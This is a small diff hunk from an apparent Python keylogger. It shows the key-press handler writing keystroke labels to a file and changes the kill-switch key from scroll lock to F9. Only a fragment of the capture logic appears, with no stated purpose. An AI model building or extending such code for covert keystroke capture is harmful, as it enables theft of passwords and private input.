@@ -46,8 +46,8 @@ def on_press(key):
             file1.write(' (alt) ')
         if key == keyboard.Key.esc:
             file1.write(' (esc) ')
-        elif key == keyboard.Key.scroll_lock:
-            # Scroll lock is set to kill the process (Used mainly for testing/debugging purposes) (Plus no one uses it)
+        elif key == keyboard.Key.f9:
+            # F9 is set to kill the process (Used mainly for testing/debugging purposes) (Plus no one uses it)
             file1.close()
             return False
 
